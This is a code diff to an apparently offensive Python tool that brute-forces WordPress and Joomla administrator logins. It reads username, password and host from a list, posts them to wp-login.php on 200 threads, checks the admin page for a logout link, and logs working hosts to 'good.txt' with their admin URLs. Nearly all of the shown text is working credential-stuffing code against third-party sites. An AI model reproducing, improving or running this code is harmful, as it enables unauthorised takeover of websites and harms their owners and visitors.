@@ -21,7 +21,7 @@ good_joo = 0
 pbcount = 0
 source_file = "source.txt"
 #theard_count = int(input('Number of threads: '))
-theard_count = 300
+theard_count = 200
 def brut(string):
     global pbcount
     global domains_count
@@ -38,25 +38,27 @@ def brut(string):
             'log':t[1],
             'pwd':t[2],
             #'wp-submit': 'Log+In',
-            #'rememberme': 'forever',
+            'rememberme': 'forever',
             'redirect_to': 'http://'+t[3]+'/wp-admin',
             'testcookie': '1'
         }
         #print('log '+t[1]+' pass '+t[2]+' host '+t[3])
         url = 'http://'+t[3]+'/wp-login.php'
-        s = requests.Session()
-        try:    
-            s.post(url, data=payload, headers=headers, timeout = 10)
-        except Exception:
-            #print('ERROR')
-            return False
-        response = s.get('http://'+t[3]+'/wp-admin', headers=headers, timeout = 10)
-        #if response.status_code == 200:
-        if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
-        #if response.text.find('action=lostpassword')<0:
-            return 2
-        else:
-            return False
+        response = requests.get(url, headers=headers, timeout = 10, allow_redirects=False)        
+        #print(response.status_code)
+        if (response.status_code) == 200:
+            s = requests.Session()
+            try:    
+                s.post(url, data=payload, headers=headers, timeout = 10)
+            except Exception:
+                #print('ERROR')
+                return False
+            response = s.get('http://'+t[3]+'/wp-admin', headers=headers, timeout = 10)
+            if response.text.find('action=lostpassword')<0 and response.text.find('action=logout')>0:
+                return 2
+            else:
+                return False
+        else: return False
 #---------------------------------------------------------------------------------------
 #---------------------------------------------------------------------------------------
     if int(cms) == 1:
@@ -158,12 +160,12 @@ def run(queue, result_queue):
         if status == 2:
             good_wp = good_wp + 1
             #print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
-            open('good.txt', 'a+').write('WP: '+host + '\n')
+            open('good.txt', 'a+').write(host + '/wp-login.php\n')
 #----------------JOOMLA-------------------------------------------------
         if status == 3:
             good_joo = good_joo + 1
             #print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
-            open('good.txt', 'a+').write('Joomla: '+host + '\n')
+            open('good.txt', 'a+').write(host + '/administrator/index.php\n')
         else:
             pass
         #print('Finished in thread {}. Result={}'.format(current_thread(), status))
